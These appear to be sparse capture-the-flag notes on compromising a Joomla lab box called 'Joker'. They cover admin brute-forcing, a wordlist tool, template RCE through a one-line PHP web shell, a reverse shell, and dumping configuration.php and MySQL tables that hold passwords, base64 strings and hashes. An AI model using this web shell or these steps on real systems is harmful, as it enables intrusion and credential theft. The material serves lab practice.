/robots\.txt

# If the Joomla site is installed within a folder 
# eg www\.example\.com/joomla/ then the robots\.txt file 
# MUST be moved to the site root 
# eg www\.example\.com/robots\.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths\. 
# eg the Disallow rule for the /administrator/ folder MUST 
# be changed to read 
# Disallow: /joomla/administrator/
#
# For more information about the robots\.txt standard, see:
# http://www\.robotstxt\.org/orig\.html
#
# For syntax checking, see:
# http://tool\.motoricerca\.info/robots\-checker\.phtml

User\-agent: \*
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/

bruteforce /joomla/administrator

cewl \- create custom wordlist

-  joomla:Gotham
-  Joomla template RCE 
-  \<?php system\($\_GET\['cmd'\]\); ?\>
-  php reverse shell 
$ id 
www\-data

$ /var/www/joomla2
cat configuration\.php
\<?php
class JConfig \{
public $offline = '0';
public $offline\_message = 'This site is down for maintenance\.\<br /\>Please check back again soon\.';
public $display\_offline\_message = '1';
public $offline\_image = '';
public $sitename = 'Joker';
public $editor = 'tinymce';
public $captcha = '0';
public $list\_limit = '20';
public $access = '1';
public $debug = '0';
public $debug\_lang = '0';
public $dbtype = 'mysqli';
public $host = 'localhost';
public $user = 'joomla';
public $password = 'babyjoker';
public $db = 'joomla\_db';
public $dbprefix = 'jnqcu\_';
public $live\_site = '';
public $secret = 'fNRyp6KO51013435';
public $gzip = '0';
public $error\_reporting = 'default';
public $helpurl = '[https://help.joomla.org/proxy/index.php?keyref=Help](#https://help.joomla.org/proxy/index.php?keyref=Help)
\{major\}\{minor\}:\{keyref\}';
public $ftp\_host = '';
public $ftp\_port = '';
public $ftp\_user = '';
public $ftp\_pass = '';
public $ftp\_root = '';
public $ftp\_enable = '0';
public $offset = 'UTC';
public $mailonline = '1';
public $mailer = 'mail';
public $mailfrom = 'admin@joker';
public $fromname = 'Joker';
public $sendmail = '/usr/sbin/sendmail';
public $smtpauth = '0';
public $smtpuser = '';
public $smtppass = '';
public $smtphost = 'localhost';
public $smtpsecure = 'none';
public $smtpport = '25';
public $caching = '0';
public $cache\_handler = 'file';
public $cachetime = '15';
public $cache\_platformprefix = '0';
public $MetaDesc = '';
public $MetaKeys = '';
public $MetaTitle = '1';
public $MetaAuthor = '1';
public $MetaVersion = '0';
public $robots = '';
public $sef = '1';
public $sef\_rewrite = '0';
public $sef\_suffix = '0';
public $unicodeslugs = '0';
public $feed\_limit = '10';
public $feed\_email = 'none';
public $log\_path = '/var/www/html/joomla/administrator/logs';
public $tmp\_path = '/var/www/html/joomla/tmp';
public $lifetime = '15';
public $session\_handler = 'database';
public $shared\_session = '0';
\}$ 

-  mysql \-u joomla \-p
$ babyjoker

-  DB batjoke
-  select \* from taskforce;                                                                                                                                                                                                 
select \* from taskforce;                                                                                                                                                                                                                    
\+\-\-\-\-\+\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+                                                                                                                                                      
| id | type    | date       | name    | pswd                                         |                                                                                                                                                      
\+\-\-\-\-\+\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+                                                                                                                                                      
|  1 | Soldier | 2020\-06\-14 | Bane    | YmFuZWlzaGVyZQ==                             |                                                                                                                                                      
|  2 | Soldier | 2020\-06\-14 | Aaron   | YWFyb25pc2hlcmU=                             |                                                                                                                                                      
|  3 | Soldier | 2020\-06\-14 | Carnage | Y2FybmFnZWlzaGVyZQ==                         |                                                                                                                                                      
|  4 | Soldier | 2020\-06\-14 | buster  | YnVzdGVyaXNoZXJlZmY=                         |                                                                                                                                                      
|  6 | Soldier | 2020\-06\-14 | rob     | Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/su  |                                                                                                                                                      
|  7 | Soldier | 2020\-06\-14 | aunt    | YXVudGlzIHRoZSBmdWNrIGhlcmU=                 |                                                                                                                                                      
\+\-\-\-\-\+\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+   

-  DB mysql
-  select \* from user;
select \* from user;
\+\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+
| Host      | User   | Password                                  | Select\_priv | Insert\_priv | Update\_priv | Delete\_priv | Create\_priv | Drop\_priv | Reload\_priv | Shutdown\_priv | Process\_priv | File\_priv | Grant\_priv | References\_priv | Index\_priv | Alter\_priv | Show\_db\_priv | Super\_priv | Create\_tmp\_table\_priv | Lock\_tables\_priv | Execute\_priv | Repl\_slave\_priv | Repl\_client\_priv | Create\_view\_priv | Show\_view\_priv | Create\_routine\_priv | Alter\_routine\_priv | Create\_user\_priv | Event\_priv | Trigger\_priv | Create\_tablespace\_priv | Delete\_history\_priv | ssl\_type | ssl\_cipher | x509\_issuer | x509\_subject | max\_questions | max\_updates | max\_connections | max\_user\_connections | plugin      | authentication\_string | password\_expired | is\_role | default\_role | max\_statement\_time |
\+\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+
| localhost | root   | \*DA907B0905865CB75CA7BFA8F79659C95E91EF7A | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      | Y                   |          |            |             |              |             0 |           0 |               0 |                    0 | unix\_socket |                       | N                | N       |              |           0\.000000 |
| localhost | joomla | \*DA907B0905865CB75CA7BFA8F79659C95E91EF7A | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | N          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      | Y                   |          |            |             |              |             0 |           0 |               0 |                    0 |             |                       | N                | N       |              |           0\.000000 |
\+\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\+
2 rows in set \(0\.000 sec\)
